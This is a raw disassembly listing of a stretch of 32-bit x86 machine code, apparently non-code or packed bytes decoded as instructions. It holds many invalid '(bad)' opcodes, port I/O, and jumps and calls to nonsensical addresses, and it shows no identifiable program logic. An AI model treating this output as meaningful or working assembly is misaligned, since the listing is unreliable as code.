  413788:	adc    BYTE PTR [ecx-0x14],ah
  41378b:	inc    ebp
  41378c:	mov    ebx,ebp
  41378e:	mov    ah,0xeb
  413790:	or     BYTE PTR [ecx-0x14],dh
  413793:	inc    ebp
  413794:	xchg   DWORD PTR [edx],esi
  413796:	xor    al,0x8f
  413798:	shr    BYTE PTR [edx-0x4f],1
  41379b:	pop    es
  41379c:	mov    ecx,ebp
  41379e:	jnp    0x4137a8
  4137a0:	mov    DWORD PTR [eax],eax
  4137a2:	or     ecx,DWORD PTR [ebx-0x1b]
  4137a5:	sbb    BYTE PTR [ecx+0xb],ah
  4137a8:	aas    
  4137a9:	mov    ebx,ebx
  4137ab:	dec    edx
  4137ac:	in     eax,0x10
  4137ae:	push   ecx
  4137af:	or     edi,DWORD PTR [edi]
  4137b1:	mov    ecx,ebx
  4137b3:	dec    eax
  4137b4:	in     eax,0x8
  4137b6:	inc    ecx
  4137b7:	or     BYTE PTR [edi],bh
  4137b9:	mov    ecx,ebx
  4137bb:	jg     0x41378a
  4137bd:	mov    al,cl
  4137bf:	scas   al,BYTE PTR es:[edi]
  4137c0:	mov    edi,0x88bcc908
  4137c5:	in     eax,0x1a
  4137c7:	daa    
  4137c8:	or     DWORD PTR [ebx+0x7],edx
  4137cb:	mov    edx,0x7ebd458a
  4137d0:	push   esp
  4137d1:	or     BYTE PTR [edx],ah
  4137d3:	stc    
  4137d4:	mov    cl,BYTE PTR [ebp-0x7f]
  4137d7:	jle    0x413821
  4137d9:	add    al,0x10
  4137db:	ss shr bl,0x0
	...
  4137ef:	add    BYTE PTR [ebp+0x6a81cad8],dl
  4137f5:	add    DWORD PTR [edi],ecx
  4137f7:	divps  xmm3,xmm0
  4137fa:	fmul   DWORD PTR [ecx+0x4e3477f]
  413800:	cwde   
  413801:	adc    eax,0x2508d688
  413806:	or     eax,0xf2801f31
  41380b:	cmp    DWORD PTR [edx+0x4900fe11],0xf89d8d8
  413815:	dec    eax
  413816:	jecxz  0x413828
  413818:	sub    BYTE PTR ds:0x24d8ce88,dl
  41381e:	push   DWORD PTR [eax]
  413820:	pop    es
  413821:	xor    dl,0x81
  413824:	jmp    0xd7d8:0x2a3332d5
  41382b:	mov    eax,esi
  41382d:	cmp    eax,DWORD PTR [ecx-0x1b]
  413830:	repnz ficom WORD PTR [edx]
  413833:	mov    BYTE PTR [esi],ah
  413835:	cs push ds
  413837:	pop    es
  413838:	and    DWORD PTR [edx],ebx
  41383a:	jns    0x41382e
  41383c:	jno    0x41384b
  41383e:	or     edi,edi
  413840:	fdivrp st(0),st
  413842:	rcr    cl,cl
  413844:	imul   ecx,edx,0x1ef8e542
  41384a:	mov    BYTE PTR ds:0x6bf602dc,bh
  413851:	push   ebx
  413852:	adc    al,al
	...
  413864:	add    BYTE PTR [eax],al
  413866:	(bad)  
  413867:	jmp    0x77331eec
  41386c:	adc    cl,BYTE PTR [eax]
  41386e:	test   eax,0xae303367
  413873:	adc    BYTE PTR [bx+si+0x5693],al
  413878:	push   edi
  413879:	test   eax,0x3027df5a
  41387e:	test   eax,0x6911d56b
  413883:	mov    ecx,0x6cd7ee42
  413888:	and    al,0x0
  41388a:	jns    0x41390a
  41388c:	cli    
  41388d:	stc    
  41388e:	das    
  41388f:	xor    ecx,DWORD PTR [edi+eax*1]
  413892:	lock out dx,eax
  413894:	add    DWORD PTR [ecx+0x1b232f26],ecx
  41389a:	jns    0x4138cd
  41389c:	inc    edx
  41389d:	out    dx,al
  41389e:	in     al,dx
  41389f:	data16 adc BYTE PTR [eax],cl
  4138a2:	cmp    esp,DWORD PTR [edi+0x43]
  4138a5:	xor    BYTE PTR [eax],0xf4
  4138a8:	rcr    BYTE PTR ds:0xe5802279,1
  4138ae:	out    0x64,eax
  4138b0:	aad    0xb4
  4138b2:	fcomp  DWORD PTR [edx+0x768ffc2]
  4138b8:	inc    esi
  4138b9:	inc    edx
  4138ba:	push   ds
  4138bb:	or     DWORD PTR [eax+0x24],ebp
  4138be:	or     eax,DWORD PTR [edi]
  4138c0:	out    0x3,eax
  4138c2:	jmp    0x41387d
  4138c4:	iret   
  4138c5:	mov    al,0xb0
  4138c7:	push   es
  4138c8:	jo     0x4138f6
	...
  4138da:	add    BYTE PTR [eax],al
  4138dc:	mov    al,0xf1
  4138de:	in     eax,dx
  4138df:	or     dh,0x2
  4138e2:	call   0x364f28ea
  4138e7:	retf   
  4138e8:	inc    eax
  4138e9:	dec    eax
  4138ea:	out    0x7c,eax
  4138ec:	scas   al,BYTE PTR es:[edi]
  4138ed:	(bad)  
  4138ee:	into   
  4138ef:	bnd jo 0x4138db
  4138f2:	rol    DWORD PTR [eax+esi*8],cl
  4138f5:	push   es
  4138f6:	loop   0x41394a
  4138f8:	call   DWORD PTR [ecx+0x28]
  4138fb:	add    al,0x79
  4138fd:	jnp    0x4138b2
  4138ff:	jge    0x4138ae
  413901:	test   DWORD PTR [edi-0x5329700],esp
  413907:	jmp    0x22ac1974
  41390c:	into   
  41390d:	(bad)  
  41390e:	rcl    DWORD PTR [eax-0x41],cl
  413911:	pop    eax
  413912:	sub    BYTE PTR [ebx+ebp*8],al
  413915:	jnp    0x4138aa
  413917:	jge    0x4138af
  413919:	(bad)  
  41391a:	xchg   esi,eax
  41391b:	add    dh,BYTE PTR [ecx-0x17]
  41391e:	jnp    0x413924
  413920:	lock push es
  413922:	loop   0x413976
  413924:	daa    
  413925:	pop    ebx
  413926:	sub    BYTE PTR [ecx+ebp*2],al
  413929:	loope  0x413953
  41392b:	sbb    edi,ebp
  41392d:	xchg   DWORD PTR [esi+0x8],eax
  413930:	inc    edi
  413931:	add    eax,ebp
  413933:	inc    BYTE PTR [esi+0x37c4b93e]
  413939:	mov    fs,WORD PTR [esi]
  41393b:	inc    ebp
  41393c:	push   ds
  41393d:	sbb    BYTE PTR [eax+0x23],ch
	...
  413950:	add    BYTE PTR [eax],al
  413952:	sub    eax,DWORD PTR [esi]
  413954:	add    cl,ch
  413956:	repz or eax,0x4663f1b5
  41395c:	add    al,bl
  41395e:	in     eax,0x8e
  413960:	(bad)  
  413961:	sub    dl,dl
  413963:	sbb    eax,0xf0b53e87
  413968:	add    al,0x60
  41396a:	fisttp WORD PTR [esi]
  41396c:	stc    
  41396d:	jo     0x4139a1
  41396f:	test   eax,eax
  413971:	in     eax,0xbe
  413973:	and    al,BYTE PTR [edi+0x3dea7717]
  413979:	(bad)  
  41397a:	sar    BYTE PTR [ebx+0xb53c38],0x89
  413981:	mov    esi,0x6806f12c
  413986:	adc    bh,ah
  413988:	add    cl,ch
  41398a:	repz or esi,DWORD PTR [ebp+0x476701]
  413991:	jo     0x41396d
  413993:	(bad)  
  413994:	in     eax,dx
  413995:	out    0x74,eax
  413997:	jmp    0x7352398
  41399c:	or     DWORD PTR [esi-0x45],ebx
  41399f:	push   edi
  4139a0:	aas    
  4139a1:	jmp    0x87011aaa
  4139a6:	add    DWORD PTR [edi+0x6f38de5],0x37c2f200
  4139b0:	dec    ebp
  4139b1:	sub    ah,ch
  4139b3:	lea    esi,[ebx+0x7d]
	...
  4139c6:	add    BYTE PTR [eax],al
  4139c8:	fmul   st(1),st
  4139ca:	sub    DWORD PTR [ecx+0x1ad18f57],0x6ade8f5a
  4139d4:	adc    DWORD PTR [ecx-0x77],eax
  4139d7:	sbb    eax,0xa85637a1
  4139dc:	repz or esi,DWORD PTR [ebx+0x0]
  4139e0:	in     eax,dx
  4139e1:	sbb    dh,0xc1
  4139e4:	mov    dh,0x5
  4139e6:	jg     0x4139cf
  4139e8:	in     eax,0x3
  4139ea:	add    BYTE PTR [eax],al
  4139ec:	adc    dl,BYTE PTR [ebp+0x35]
  4139ef:	push   esp
  4139f0:	pop    eax
  4139f1:	add    al,0x87
  4139f3:	(bad)  
  4139f5:	sbb    al,0xb
  4139f7:	sub    esi,0x9fffd07
  4139fd:	add    DWORD PTR [edi-0x23574c8],esi
  413a03:	mov    BYTE PTR [esi],al
  413a05:	dec    ebx
  413a06:	out    dx,al
  413a07:	push   ss
  413a08:	dec    eax
  413a09:	and    eax,0x3c900f9
  413a0e:	or     DWORD PTR [edi+0x40bb11],esi
  413a14:	call   0xa18f382c
  413a19:	mov    DWORD PTR [eax+edi*8-0x37],edi
  413a1d:	inc    BYTE PTR [ebx+ebp*4-0x7601f249]
  413a24:	popa   
  413a25:	inc    ebx
  413a26:	fstp   QWORD PTR [edi]
  413a28:	adc    BYTE PTR ds:0xeed0,bh
	...
  413a3e:	adc    BYTE PTR [eax+ecx*1-0xf],al
  413a42:	add    BYTE PTR [ebx],bh
  413a44:	xor    al,cl
  413a46:	add    BYTE PTR [edx-0x80],cl
  413a49:	jecxz  0x413a7e
  413a4b:	popa   
  413a4c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413a4d:	stos   BYTE PTR es:[edi],al
  413a4e:	cwde   
  413a4f:	xor    DWORD PTR [eax],esi
  413a51:	fchs   
  413a53:	cmp    al,al
  413a55:	loopne 0x413a9d
  413a57:	jl     0x413a2c
  413a59:	shl    DWORD PTR [edi+0x7b],1
  413a5c:	mov    edi,0xcd7bdb09
  413a61:	shl    DWORD PTR [ecx-0x3f37cefe],0x49
  413a68:	and    bl,0xf0
  413a6b:	pop    eax
  413a6c:	add    al,0xff
  413a6e:	lock push ds
  413a70:	sub    DWORD PTR [eax+0x7242e48],ecx
  413a76:	loope  0x413aa3
  413a78:	jns    0x413a49
  413a7a:	xor    DWORD PTR [ebp+0x6],eax
  413a7d:	xor    DWORD PTR [eax],ebp
  413a7f:	inc    bx
  413a81:	adc    BYTE PTR [ebx],0xdc
  413a84:	aam    0x32
  413a86:	ret    
  413a87:	fisubr WORD PTR [edx]
  413a89:	mov    BYTE PTR [eax],bl
  413a8b:	cs and al,0x1
  413a8e:	shr    DWORD PTR [ebx],0x79
  413a91:	(bad)  
  413a92:	mov    cl,0x18
  413a94:	hlt    
  413a95:	xor    al,al
  413a97:	ja     0x413adc
  413a99:	adc    bl,0xf5
  413a9c:	or     bh,bh
  413a9e:	xlat   BYTE PTR ds:[ebx]
  413a9f:	mov    edi,0x882b
	...
  413ab4:	test   al,0xaf
  413ab6:	and    DWORD PTR [edi],ecx
  413ab8:	add    DWORD PTR [edi-0x374e3886],ebp
  413abe:	std    
  413abf:	xor    BYTE PTR [eax-0x6c7fbb99],ah
  413ac5:	cmc    
  413ac6:	clc    
  413ac7:	push   cs
  413ac8:	idiv   esi
  413aca:	sub    ecx,DWORD PTR [edx-0x1dbd17cb]
  413ad0:	in     al,dx
  413ad1:	(bad)  
  413ad2:	cmp    al,0x88
  413ad4:	call   0xec48f949
  413ad9:	js     0x413a99
  413adb:	pop    es
  413adc:	imul   eax,DWORD PTR [eax],0x671b5da9
  413ae2:	adc    eax,0x1f8325c
  413ae7:	push   ebx
  413ae8:	mov    esi,0xec23a578
  413aed:	or     eax,0xe00c737b
  413af2:	lahf   
  413af3:	test   BYTE PTR [esi+0x7],al
  413af6:	imul   BYTE PTR [edi+0x20]
  413af9:	push   cs
  413afa:	xchg   ebp,eax
  413afb:	inc    edx
  413afc:	out    dx,al
  413afd:	mov    ch,0x27
  413aff:	mov    bl,0x64
  413b01:	dec    edx
  413b02:	fbstp  TBYTE PTR [ebx+0x8415417]
  413b08:	outs   dx,DWORD PTR es:[esi]
  413b0a:	push   DWORD PTR [esi-0x3c0f950]
  413b10:	sbb    edi,esi
  413b12:	cs clc 
  413b14:	inc    esi
  413b15:	cmc    
  413b16:	mov    ebp,0xb4
	...
  413b27:	add    BYTE PTR [eax],al
  413b29:	add    BYTE PTR [edi],cl
  413b2b:	dec    eax
  413b2c:	and    DWORD PTR [eax],ecx
  413b2e:	(bad)  
  413b2f:	outs   dx,BYTE PTR ds:[esi]
  413b30:	dec    edi
  413b31:	mov    dh,0xb0
  413b33:	push   es
  413b34:	dec    DWORD PTR [edi]
  413b36:	jmp    0xefc9:0x4aa906fd
  413b3d:	add    eax,DWORD PTR [ebp-0x70]
  413b40:	or     al,0xb3
  413b42:	daa    
  413b43:	pop    edx
  413b44:	bound  edi,QWORD PTR [esi-0x7bb6e09]
  413b4a:	je     0x413b9f
  413b4c:	fbstp  TBYTE PTR [edx+0x824ef2f]
  413b52:	mov    dh,0xfd
  413b54:	aas    
  413b55:	dec    esp
  413b56:	cmp    ecx,DWORD PTR [eax-0x19]
  413b59:	js     0x413b87
  413b5b:	call   DWORD PTR [edi]
  413b5d:	sbb    al,0xa6
  413b5f:	cli    
  413b60:	mov    dh,0x7
  413b62:	(bad)  
  413b64:	sbb    al,0xc5
  413b66:	(bad)
  413b6a:	aaa    
  413b6b:	out    dx,eax
  413b6c:	nop
  413b6d:	or     BYTE PTR [esi-0x3],bh
  413b70:	dec    DWORD PTR [ebx+0x24]
  413b73:	dec    eax
  413b74:	out    0x78,eax
  413b76:	mov    ah,0xfe
  413b78:	pop    ss
  413b79:	sbb    al,0x4a
  413b7b:	cli    
  413b7c:	jle    0x413b85
  413b7e:	ret    0x8b
  413b81:	sub    al,0xe4
  413b83:	dec    ebp
  413b84:	call   0xfe3e33f4
  413b89:	ret    0xf1c4
  413b8c:	pop    ebx
  413b8d:	sub    eax,DWORD PTR [eax]
	...
  413b9f:	add    BYTE PTR [edi*8-0x76ee9fac],bh
  413ba6:	in     al,dx
  413ba7:	stc    
  413ba8:	bound  edx,QWORD PTR [ebx-0x77]
  413bab:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413bac:	sub    edx,DWORD PTR [eax+0x4298ed73]
  413bb2:	clc    
  413bb3:	cdq    
  413bb4:	(bad)  
  413bb5:	in     eax,0xfa
  413bb7:	xor    dh,bh
  413bb9:	cld    
  413bba:	mov    ebp,DWORD PTR [ebx+eiz*8-0x3d57eb3]
  413bc1:	push   edi
  413bc2:	call   0xfe3e26cb
  413bc7:	cmp    DWORD PTR [ebx],0x68e93f50
  413bcd:	inc    ebx
  413bce:	clc    
  413bcf:	cdq    
  413bd0:	sti    
  413bd1:	xchg   esp,eax
  413bd2:	cld    
  413bd3:	imul   dh
  413bd5:	arpl   WORD PTR [eax-0x73034b63],di
  413bdb:	sub    al,0xdc
  413bdd:	dec    ebx
  413bde:	call   0xfe3e3353
  413be3:	bound  ecx,QWORD PTR [eax+0x4248a00]
  413be9:	pop    DWORD PTR [ebx-0x3b]
  413bec:	and    al,0x5b
  413bee:	lock push ecx
  413bf0:	lods   al,BYTE PTR ds:[esi]
  413bf1:	dec    ebx
  413bf2:	aas    
  413bf3:	jmp    0x1a397f10
  413bf8:	in     al,dx
  413bf9:	ins    BYTE PTR es:[edi],dx
  413bfa:	cld    
  413bfb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413bfc:	out    dx,al
  413bfd:	arpl   WORD PTR [eax],di
  413bff:	sub    al,0xb5
  413c01:	cld    
  413c02:	mov    WORD PTR [eax+eax*1],gs
	...
  413c15:	add    ah,bl
  413c17:	dec    ebx
  413c18:	call   0xfe3e3425
  413c1d:	add    dl,ah
  413c1f:	scas   al,BYTE PTR es:[edi]
  413c20:	stc    
  413c21:	mov    edx,DWORD PTR [ebx+edx*1]
  413c24:	mov    BYTE PTR [ebp-0x23],al
  413c27:	jp     0x413c85
  413c29:	lock icebp 
  413c2b:	dec    edx
  413c2c:	dec    esp
  413c2d:	inc    ecx
  413c2e:	pop    ecx
  413c2f:	jg     0x413c75
  413c31:	clc    
  413c32:	jns    0x413c54
  413c34:	inc    esi
  413c35:	cld    
  413c36:	sahf   
  413c37:	add    al,0x65
  413c39:	mov    eax,0x8cfdc38c
  413c3e:	push   esp
  413c3f:	sbb    BYTE PTR [ebp-0x18],cl
  413c42:	lock push cs
  413c44:	(bad)  
  413c45:	push   DWORD PTR [edi+0x7f]
  413c48:	inc    esp
  413c49:	clc    
  413c4a:	imul   esp,DWORD PTR [eax],0x4cefbdd
  413c50:	add    dh,0x1
  413c53:	stos   BYTE PTR es:[edi],al
  413c54:	mov    WORD PTR [ebp-0x27],es
  413c57:	mov    bh,0xe5
  413c59:	rol    DWORD PTR [edx],cl
  413c5b:	add    eax,0x7a925efe
  413c60:	jmp    0xfe4147c2
  413c65:	push   esp
  413c66:	push   eax
  413c67:	daa    
  413c68:	sub    ah,0x2d
  413c6b:	add    eax,DWORD PTR [eax]
  413c6d:	add    BYTE PTR [edx],cl
  413c6f:	lods   eax,DWORD PTR ds:[esi]
  413c70:	push   esi
  413c71:	mov    edi,esp
  413c73:	cli    
  413c74:	mov    dh,BYTE PTR [ebp-0x33]
  413c77:	je     0x413bfd
  413c79:	add    BYTE PTR [eax],0x0
	...
  413c8c:	mov    edi,0xc150fe01
  413c91:	inc    ebx
  413c92:	add    BYTE PTR [eax],al
  413c94:	mov    DWORD PTR [ebp-0x4e5e9803],ebx
  413c9a:	inc    eax
  413c9b:	add    BYTE PTR [ecx+0x4efffb77],dh
  413ca1:	xlat   BYTE PTR ds:[ebx]
  413ca2:	iret   
  413ca3:	mov    cl,BYTE PTR [ebx]
  413ca5:	retf   
  413ca6:	dec    ebx
  413ca7:	inc    ecx
  413ca8:	lock in eax,dx
  413caa:	jns    0x413caf
  413cac:	and    dh,BYTE PTR [eax]
  413cae:	jg     0x413ca9
  413cb0:	clc    
  413cb1:	add    DWORD PTR [ecx],edx
  413cb3:	(bad)  
  413cb4:	jne    0x413cbb
  413cb6:	push   es
  413cb7:	(bad)  
  413cb8:	push   edi
  413cb9:	out    dx,al
  413cba:	add    DWORD PTR [eax],eax
  413cbc:	lock mov BYTE PTR [eax+0x7d764088],dh
  413cc3:	jae    0x413d03
  413cc5:	pop    esp
  413cc6:	add    esi,DWORD PTR [eax]
  413cc8:	and    cl,BYTE PTR [eax-0x2c]
  413ccb:	mov    dh,BYTE PTR [ebp-0x2f]
  413cce:	add    edi,esi
  413cd0:	daa    
  413cd1:	jbe    0x413d50
  413cd3:	jnp    0x413cf3
  413cd5:	cmp    al,0x3
  413cd7:	(bad)  
  413cd8:	ins    DWORD PTR es:[edi],dx
  413cd9:	mov    ecx,0x680ffe03
  413cde:	jne    0x413d5b
  413ce0:	push   es
  413ce1:	and    al,0x3
  413ce3:	push   cs
  413ce4:	ds lock sbb bh,0x77
  413ce9:	push   0x9ee7b45
  413cee:	add    ecx,DWORD PTR [esi]
	...
  413d00:	add    BYTE PTR [eax],al
  413d02:	sahf   
  413d03:	rcl    edx,0xf7
  413d06:	push   0xf0023bef
  413d0b:	lods   al,BYTE PTR ds:[esi]
  413d0c:	mov    edi,0x86e8ca82
  413d11:	add    al,0x70
  413d13:	and    eax,0x32b67504
  413d18:	scas   al,BYTE PTR es:[edi]
  413d19:	out    0x4b,eax
  413d1b:	rol    BYTE PTR [esi+edi*8],cl
  413d1e:	jae    0x413ca3
  413d20:	mov    ebp,edi
  413d22:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413d23:	rol    DWORD PTR [ecx],0x80
  413d26:	fucomi st,st(7)
  413d28:	mov    fs,WORD PTR [esi-0x2768c8d]
  413d2e:	(bad)
  413d32:	popw   es
  413d34:	je     0x413db4
  413d36:	(bad)  
  413d37:	clc    
  413d38:	sahf   
  413d39:	add    al,0x27
  413d3b:	out    dx,eax
  413d3c:	push   cs
  413d3d:	add    esi,eax
  413d3f:	push   es
  413d40:	cmps   BYTE PTR cs:[esi],BYTE PTR es:[edi]
  413d42:	retf   0x938f
  413d45:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413d46:	xor    DWORD PTR [edi],ecx
  413d48:	out    0xae,eax
  413d4a:	push   0x7b1768e4
  413d4f:	or     bh,ah
  413d51:	add    esp,DWORD PTR [ebx-0x638741b0]
  413d57:	push   cs
  413d58:	jb     0x413ce8
  413d5a:	jmp    0x413ce7
  413d5c:	ins    BYTE PTR es:[edi],dx
  413d5d:	sub    DWORD PTR ds:0xfb34efa,0xfffffffa
  413d64:	out    0x3,eax
	...
  413d76:	add    BYTE PTR [eax],al
  413d78:	lock ins BYTE PTR es:[edi],dx
  413d7a:	out    0x9b,eax
  413d7c:	fisttp WORD PTR [eax-0x58]
  413d7f:	add    ebx,DWORD PTR [eax]
  413d81:	(bad)  
  413d82:	sub    al,0x4
  413d84:	push   es
  413d85:	cmp    BYTE PTR [ecx],bh
  413d87:	jns    0x413dfa
  413d89:	aas    
  413d8a:	lods   eax,DWORD PTR ds:[esi]
  413d8b:	ret    0x81f7
  413d8e:	jmp    0x413d61
  413d90:	xor    DWORD PTR [esi-0x7940cef],eax
  413d96:	cs jle 0x413e00
  413d99:	stc    
  413d9a:	inc    BYTE PTR [ebx]
  413d9c:	lock push es
  413d9e:	out    0x3,eax
  413da0:	fist   DWORD PTR [edx+0x60]
  413da3:	adc    edi,DWORD PTR [eax-0x7d]
  413da6:	pop    ebx
  413da7:	add    bh,BYTE PTR [esi-0x3629e707]
  413dad:	bound  ecx,QWORD PTR ss:[ecx+0x3cef924]
  413db4:	js     0x413d39
  413db6:	inc    ebx
  413db7:	add    bl,BYTE PTR [esi+0x1c89bef9]
  413dbd:	stc    
  413dbe:	add    BYTE PTR [esi+0x2d8b8cf3],dh
  413dc4:	repnz clc 
  413dc6:	std    
  413dc7:	div    BYTE PTR [ecx+0x73898107]
  413dcd:	(bad)  
  413dce:	mov    ebx,0xfdf8f215
  413dd3:	fisubr WORD PTR [ecx+0x6c812f3b]
  413dd9:	stc    
  413dda:	ret    
  413ddb:	jmp    0x0:0x0
	...
  413dee:	repz inc edi
  413df0:	inc    edx
  413df1:	push   0x4e
  413df3:	push   ss
  413df4:	jnp    0x413dda
  413df6:	jae    0x413e37
  413df8:	add    ah,bl
  413dfa:	sub    DWORD PTR [eax+0x56],edx
  413dfd:	push   ecx
  413dfe:	repnz cli 
  413e00:	std    
  413e01:	push   esi
  413e02:	ja     0x413da9
  413e04:	js     0x413e55
  413e06:	repz clc 
  413e08:	add    BYTE PTR [ecx-0x21],ch
  413e0b:	push   es
  413e0c:	jae    0x413d94
  413e0e:	outs   dx,DWORD PTR ds:[esi]
  413e0f:	mov    ebp,0xf8f33778
  413e14:	add    BYTE PTR [ecx+edx*2-0xd967c73],dh
  413e1b:	clc    
  413e1c:	std    
  413e1d:	mov    ecx,0xe900a10b
  413e22:	repz pop ecx
  413e24:	pop    esi
  413e25:	mov    dl,0x74
  413e27:	jmp    0x413e84
  413e29:	sub    ebp,esp
  413e2b:	push   es
  413e2c:	push   ecx
  413e2d:	xchg   edi,eax
  413e2e:	cmp    cl,BYTE PTR [esi+0x60e3cd44]
  413e34:	mov    DWORD PTR [ebp+0x6c66130f],ecx
  413e3a:	sahf   
  413e3b:	je     0x413e46
  413e3d:	jo     0x413de8
  413e3f:	mov    WORD PTR [eax-0x7],?
  413e42:	sbb    DWORD PTR [ebp+0xf96e8ff],edi
  413e48:	mov    eax,DWORD PTR [eax]
  413e4a:	fst    DWORD PTR [edx]
  413e4c:	test   edi,eax
  413e4e:	das    
  413e4f:	xor    dl,dl
  413e51:	sldt   WORD PTR [eax]
	...
  413e64:	push   cs
  413e65:	rcl    BYTE PTR [edx-0x7d],cl
  413e68:	pop    ecx
  413e69:	or     al,0x50
  413e6b:	call   0x3d3b7d
  413e70:	loope  0x413eac
  413e72:	dec    ecx
  413e73:	inc    ecx
  413e74:	pop    ecx
  413e75:	in     al,dx
  413e76:	cmp    bh,cl
  413e78:	jbe    0x413e7f
  413e7a:	push   cs
  413e7b:	mov    bh,0x92
  413e7d:	push   ecx
  413e7e:	push   ebx
  413e7f:	call   0x3d3bdd
  413e84:	icebp  
  413e85:	mov    edx,0xec594149
  413e8a:	es stc 
  413e8c:	(bad)  
  413e8d:	add    al,0xe
  413e8f:	mov    bh,0xb2
  413e91:	push   eax
  413e92:	push   esi
  413e93:	call   0x3d3bfd
  413e98:	push   esi
  413e99:	push   di
  413e9b:	ret    0x421
  413e9e:	dec    edi
  413e9f:	mov    esi,DWORD PTR [ebp+0x20]
  413ea2:	or     BYTE PTR [ebx-0x4f],dl
  413ea5:	or     ch,dh
  413ea7:	call   esi
  413ea9:	cmp    BYTE PTR [edi+0x40980],0xb8
  413eb0:	adc    DWORD PTR [edi+0x3d],edx
  413eb3:	add    BYTE PTR [edx+0x14],dl
  413eb6:	test   DWORD PTR [ebx],edx
  413eb8:	pop    edx
  413eb9:	les    eax,FWORD PTR [ebx+eax*4]
  413ebc:	or     al,BYTE PTR [eax]
  413ebe:	cmp    DWORD PTR [eax+0x72004284],edi
  413ec4:	idiv   BYTE PTR [ebx+0x4db8]
	...
  413eda:	cwde   
  413edb:	add    eax,DWORD PTR [edi+0x7f124010]
  413ee1:	ror    ch,0x82
  413ee4:	mov    edi,0x3c12f004
  413ee9:	dec    esi
  413eea:	xor    esi,ebp
  413eec:	jae    0x413edb
  413eee:	cmp    ebp,DWORD PTR [eax+ecx*1+0x60754300]
  413ef5:	and    al,0xf8
  413ef7:	sbb    al,0xec
  413ef9:	call   0x8040e786
  413efe:	mov    bl,0x6d
  413f00:	add    al,0x0
  413f02:	lock gs cmp al,0x4b
  413f06:	mov    cl,0xed
  413f08:	mov    WORD PTR [ecx],ss
  413f0a:	jns    0x413f09
  413f0c:	test   cl,al
  413f0e:	hlt    
  413f0f:	ins    BYTE PTR es:[edi],dx
  413f10:	les    eax,FWORD PTR [edx*1-0xfc0b2ba]
  413f17:	sti    
  413f18:	lock mov eax,0x411a88
  413f1e:	imul   edi,esp,0xffffff8a
  413f21:	adc    BYTE PTR [ebx+0x2c],dh
  413f24:	or     BYTE PTR [ecx+0x383ee930],al
  413f2a:	mov    dh,0xae
  413f2c:	add    DWORD PTR [edx+0xf],esi
  413f2f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413f30:	ret    
  413f31:	add    al,0xf0
  413f33:	xchg   edx,eax
  413f34:	mov    ah,bl
  413f36:	jae    0x413f79
  413f38:	sbb    al,0x51
  413f3a:	sahf   
  413f3b:	fs pop ebp
  413f3d:	or     BYTE PTR [eax],al
	...
  413f4f:	add    BYTE PTR [ebx-0x66],ch
  413f52:	or     eax,0x5425ad8b
  413f57:	push   ecx
  413f58:	fmul   DWORD PTR [ebx]
  413f5a:	cld    
  413f5b:	std    
  413f5c:	out    0x53,eax
  413f5e:	inc    ebp
  413f5f:	lock inc eax
  413f61:	jnp    0x413fa6
  413f63:	or     BYTE PTR [eax+0x18],al
  413f66:	in     al,0xf8
  413f68:	iret   
  413f69:	std    
  413f6a:	mov    es,WORD PTR [ebx-0x28]
  413f6d:	nop
  413f6e:	test   cl,al
  413f70:	loopne 0x413f78
  413f72:	cmp    ch,ah
  413f74:	mov    eax,ds:0x1900deef
  413f79:	scas   eax,DWORD PTR es:[edi]
  413f7a:	and    eax,DWORD PTR [ebx-0x10]
  413f7d:	and    DWORD PTR [esp+edi*8],0x40
  413f81:	fild   WORD PTR [ebx+edi*8-0x6b]
  413f85:	test   BYTE PTR [edi-0x44],0x3c
  413f89:	dec    eax
  413f8a:	out    0x8e,eax
  413f8c:	xor    esi,edi
  413f8e:	pop    ss
  413f8f:	in     al,dx
  413f90:	or     eax,0x900a6f0
  413f95:	scas   eax,DWORD PTR es:[edi]
  413f96:	sub    eax,DWORD PTR [ebx-0x10]
  413f99:	sub    DWORD PTR [esp+ebp*8],0xffffffc0
  413f9d:	fimul  WORD PTR [eax]
  413f9f:	sti    
  413fa0:	pop    ebp
  413fa1:	div    BYTE PTR [edx+0x5e]
  413fa4:	push   esp
  413fa5:	and    BYTE PTR [esp+esi*8],0x77
  413fa9:	dec    esp
  413faa:	jae    0x413f36
  413fac:	stos   DWORD PTR es:[edi],eax
  413fad:	mul    BYTE PTR [edx+0x5e]
  413fb0:	inc    esp
  413fb1:	sub    BYTE PTR [ebx+ebp*8+0x0],0x0
	...
  413fc5:	add    BYTE PTR [edi+0x4c],ch
  413fc8:	push   ebx
  413fc9:	mov    cl,bl
  413fcb:	fidivr WORD PTR [edi-0x18b844c5]
  413fd1:	mov    ?,WORD PTR [ebx-0x26146812]
  413fd7:	out    dx,eax
  413fd8:	add    BYTE PTR ds:[ecx-0xfbd5bd2],bl
  413fdf:	and    DWORD PTR [ebx+esi*8-0x52b2160],0xfffffff5
  413fe7:	cmc    
  413fe8:	(bad)  
  413fe9:	cmp    edi,DWORD PTR [ebx]
  413feb:	dec    eax
  413fec:	out    0x8e,eax
  413fee:	xor    ebx,edi
  413ff0:	mov    bh,0xeb
  413ff2:	std    
  413ff3:	out    dx,eax
  413ff4:	push   es
  413ff5:	add    BYTE PTR [edx+0x53],ch
  413ff8:	sti    
  413ff9:	mov    esi,DWORD PTR [ebx]
  413ffb:	test   DWORD PTR [eax],0x87f32e60
  414001:	mov    ebx,es
  414003:	jg     0x414060
  414005:	(bad)  [ebx+0x49]
  414008:	call   0x883c797d
  41400d:	xor    al,0x94
  41400f:	pop    esi
  414010:	mov    eax,0x8b07351c
  414015:	sub    al,0x94
  414017:	push   esi
  414018:	call   0xfe34ccdd
  41401d:	inc    ecx
  41401e:	inc    esp
  41401f:	inc    ecx
  414020:	aas    
  414021:	jmp    0x3a318986
  414026:	test   bh,bl
  414028:	clc    
  414029:	sahf   
	...
  41403a:	add    BYTE PTR [eax],al
  41403c:	outs   dx,DWORD PTR ds:[esi]
  41403d:	pop    esi
  41403e:	mov    eax,0x8b06ad24
  414043:	and    al,0x4c
  414045:	push   esi
  414046:	call   0xfe3494ef
  41404b:	pop    ss
  41404c:	popa   
  41404d:	dec    ecx
  41404e:	clc    
  41404f:	sbb    DWORD PTR [edx+ecx*4-0x8],edx
  414053:	outs   dx,BYTE PTR ds:[esi]
  414054:	aas    
  414055:	add    DWORD PTR [esi-0xf],0x594381a3
  41405c:	(bad)  
  41405d:	fidiv  WORD PTR [ebp+0x51]
  414060:	daa    
